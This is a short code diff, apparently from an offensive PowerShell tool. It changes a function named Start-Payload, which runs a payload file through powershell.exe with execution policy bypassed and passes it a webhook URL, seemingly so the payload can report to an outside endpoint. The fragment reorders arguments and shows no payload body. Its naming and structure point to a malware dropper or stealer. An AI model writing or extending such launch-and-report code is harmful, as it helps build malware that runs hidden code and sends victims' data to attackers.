@@ -42,7 +42,7 @@ function Start-Payload {
     try {
         Write-Output "Executing payload $destino"
         Write-Output "Webhook URL: $dc"
-        $command = "powershell.exe -Ep Bypass -dc $dc -File $destino"
+        $command = "powershell.exe -Ep Bypass -File $destino -dc $dc"
         Invoke-Expression $command
         Write-Output "Script executed successfully"
     }
